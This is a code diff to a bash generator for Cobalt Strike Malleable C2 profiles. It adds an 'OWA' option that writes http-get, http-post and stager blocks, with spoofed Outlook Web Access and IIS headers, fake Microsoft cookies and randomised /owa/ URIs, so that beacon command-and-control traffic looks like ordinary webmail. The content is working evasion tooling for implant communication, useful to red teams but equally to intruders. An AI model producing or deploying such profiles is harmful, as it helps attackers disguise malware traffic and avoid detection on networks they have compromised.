@@ -2,7 +2,7 @@
 
 read -p "What will the name of your profile be?: " prof_name
 read -p "What's the doman you're using? e.g. tld.domain: " domain_name
-read -p "What profile do you want? 1) Windows update 2) Slack (number only): " profile_selection
+read -p "What profile do you want? 1) Windows update 2) Slack 3) OWA (number only): " profile_selection
 read -p "What is your sleep value (milliseconds, 60000=1 minute)?: " sleep
 read -p "What is the jitter value (only numbers pls)?: " jitter
 
@@ -254,6 +254,18 @@ enduri7=$(randchars 19)
 enduri8=$(randchars 19)
 enduri9=$(randchars 19)
 enduri10=$(randchars 19)
+enduriowa1=$(randchars 26)
+enduriowa2=$(randchars 26)
+enduriowa3=$(randchars 26)
+enduriowa4=$(randchars 26)
+enduriowa5=$(randchars 26)
+enduriowa6=$(randchars 26)
+enduriowa7=$(randchars 26)
+enduriowa8=$(randchars 26)
+enduriowa9=$(randchars 26)
+enduriowa10=$(randchars 26)
+
+
 
 
 WinUpdate_func () {
@@ -340,7 +352,6 @@ Slack_func () {
 	maxage3=$(echo $((172800 + $RANDOM % 31536001)))
 
 	echo "http-config {
-	#set \"true\" if teamserver is behind redirector
 	set trust_x_forwarded_for \"false\";
 	}
 
@@ -517,8 +528,145 @@ Slack_func () {
 		}"
 }
 
-#Outlook_func () {
-#}
+Owa_func () {
+
+	uvalue=$(echo $((6 + $RANDOM % 15)))
+	uvalue2=$(randchars $uvalue)
+	namprd=$(echo $((2 + $RANDOM % 8)))
+	num86=$(echo $((19340 + $RANDOM % 15370000)))
+	num64=$(echo $((19340 + $RANDOM % 15370000)))
+
+	echo "http-config {
+	set trust_x_forwarded_for \"false\";
+	}
+
+	http-get {
+
+		set uri \"/owa/$enduriowa1 /owa/$enduriowa2 /owa/$enduriowa3 /owa/$enduriowa4 /owa/$enduriowa5 \";
+
+
+	client {
+
+	header \"Host\" \"$domain_name\";
+	header \"Accept\" \"*/*\";
+	header \"Cookie\" \"MicrosoftApplicationsTelemetryDeviceId=95c18d8-4dce9854;ClientId=1C0F6C5D910F9;MSPAuth=3EkAjDKjI;xid=730bf7;wla42=$uvalue2\";
+		
+		metadata {
+			base64url;
+			parameter \"wa\";
+
+
+		}
+
+	parameter \"path\" \"/calendar\";
+
+	}
+
+	server {
+
+	header \"Cache-Control\" \"no-cache\";
+	header \"Pragma\" \"no-cache\";
+	header \"Content-Type\" \"text/html; charset=utf-8\";
+	header \"Server\" \"Microsoft-IIS/10.0\";
+	header \"request-id\" \"6cfcf35d-0680-4853-98c4-b16723708fc9\";
+	header \"X-CalculatedBETarget\" \"BY2PR06MB549.namprd0$namprd.prod.outlook.com\";
+	header \"X-Content-Type-Options\" \"nosniff\";
+	header \"X-OWA-Version\" \"15.1.1240.20\";
+	header \"X-OWA-OWSVersion\" \"V2017_06_15\";
+	header \"X-OWA-MinimumSupportedOWSVersion\" \"V2_6\";
+	header \"X-Frame-Options\" \"SAMEORIGIN\";
+	header \"X-DiagInfo\" \"BY2PR06MB549\";
+	header \"X-UA-Compatible\" \"IE=EmulateIE7\";
+	header \"X-Powered-By\" \"ASP.NET\";
+	header \"X-FEServer\" \"CY4PR02CA0010\";
+	header \"Connection\" \"close\";
+		
+
+		output {
+			base64url;
+			print;
+		}
+	}
+	}
+
+	http-post {
+
+	set uri \"/owa/$enduriowa6 /owa/$enduriowa7 /owa/$enduriowa8 /owa/$enduriowa9 /owa/$enduriowa10 \";
+	set verb \"GET\";
+
+	client {
+
+	header \"Host\" \"$domain_name\";
+	header \"Accept\" \"*/*\";     
+		
+		output {
+			base64url;
+		parameter \"wa\";
+
+
+		}
+
+
+
+		id {
+			base64url;
+
+		prepend \"wla42=\";
+		prepend \"xid=730bf7;\";
+		prepend \"MSPAuth=3EkAjDKjI;\";
+		prepend \"ClientId=1C0F6C5D910F9;\";
+		prepend \"MicrosoftApplicationsTelemetryDeviceId=95c18d8-4dce9854;\";
+		header \"Cookie\";
+
+
+		}
+	}
+
+	server {
+
+	header \"Cache-Control\" \"no-cache\";
+	header \"Pragma\" \"no-cache\";
+	header \"Content-Type\" \"text/html; charset=utf-8\";
+	header \"Server\" \"Microsoft-IIS/10.0\";
+	header \"request-id\" \"6cfcf35d-0680-4853-98c4-b16723708fc9\";
+	header \"X-CalculatedBETarget\" \"BY2PR06MB549.namprd0$namprd.prod.outlook.com\";
+	header \"X-Content-Type-Options\" \"nosniff\";
+	header \"X-OWA-Version\" \"15.1.1240.20\";
+	header \"X-OWA-OWSVersion\" \"V2017_06_15\";
+	header \"X-OWA-MinimumSupportedOWSVersion\" \"V2_6\";
+	header \"X-Frame-Options\" \"SAMEORIGIN\";
+	header \"X-DiagInfo\" \"BY2PR06MB549\";
+	header \"X-UA-Compatible\" \"IE=EmulateIE7\";
+	header \"X-Powered-By\" \"ASP.NET\";
+	header \"X-FEServer\" \"CY4PR02CA0010\";
+	header \"Connection\" \"close\";
+		
+
+		output {
+			base64url;
+			print;
+		}
+	}
+	}
+
+	http-stager {
+
+	set uri_x86 \"/rpc/$num86\";
+	set uri_x64 \"/rpc/$num64\";
+
+	client {
+		header \"Host\" \"$domain_name\";
+	header \"Accept\" \"*/*\";
+	}
+
+	server {
+		header \"Server\" \"nginx\";    
+	}
+
+
+	}
+	"
+}
 
 storemaker () {
 	pass=$(tail -c 1m /dev/urandom | md5sum | cut -d ' ' -f 1 | awk NF | cut -c 1-15)
@@ -682,6 +830,8 @@ if [ "$profile_selection" == "1" ]; then
     WinUpdate_func >> $prof_name.profile
 elif [ "$profile_selection" == "2" ]; then
     Slack_func >> $prof_name.profile
+elif [ "$profile_selection" == "3" ]; then
+    Owa_func >> $prof_name.profile
 else
     echo "Invalid choice"
 fi
